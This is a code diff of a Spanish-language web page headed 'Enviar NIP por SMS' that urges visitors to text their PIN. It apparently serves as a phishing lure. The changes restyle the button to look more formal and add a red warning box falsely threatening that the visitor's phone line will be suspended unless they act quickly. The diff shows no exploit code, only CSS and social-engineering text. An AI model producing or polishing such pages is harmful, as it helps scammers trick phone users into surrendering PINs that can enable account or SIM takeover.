@@ -21,34 +21,38 @@
       box-shadow:0 5px 20px rgba(0,0,0,0.1);
       text-align:center;
       width:90%;
-      max-width:350px;
+      max-width:380px;
+    }
+    .alerta {
+      background:#ffdddd;
+      color:#a10000;
+      border:1px solid #a10000;
+      padding:10px;
+      border-radius:6px;
+      font-size:14px;
+      font-weight:bold;
+      margin-bottom:20px;
     }
     h1 { font-size:20px; margin-bottom:10px; }
     p { font-size:14px; color:#555; margin-bottom:20px; }
 
-    /* Botón rojo con sombra y brillo */
+    /* Botón formal */
     .btn {
       display:inline-block;
-      padding:12px 20px;
-      background:#ff0000; /* Rojo */
+      padding:12px 25px;
+      background:#c00000; /* Rojo elegante */
       color:#fff;
       text-decoration:none;
       font-size:16px;
-      border-radius:8px;
-      transition: background 0.3s, box-shadow 0.3s;
-      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.4); /* Sombra roja */
+      font-weight:bold;
+      border-radius:6px;
+      border: none;
+      transition: background 0.3s, transform 0.2s;
     }
     .btn:hover { 
-      background:#cc0000; /* Rojo más oscuro */
-      box-shadow: 0 6px 15px rgba(255, 0, 0, 0.6), 0 0 10px rgba(255,0,0,0.8);
-      animation: pulso 1s infinite;
-    }
-
-    /* Animación de pulso */
-    @keyframes pulso {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
+      background:#900000; /* Rojo más oscuro */
+      transform: translateY(-2px); /* Pequeño efecto de elevación */
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
     }
 
     .warning {
@@ -61,6 +65,10 @@
 </head>
 <body>
   <div class="container">
+    <div class="alerta">
+      ⚠️ Actualiza tu línea lo antes posible, de lo contrario será suspendida.
+    </div>
+
     <h1>Enviar NIP por SMS</h1>
     <p>Haz clic en el botón para abrir tu app de mensajes y enviar el NIP.</p>
 
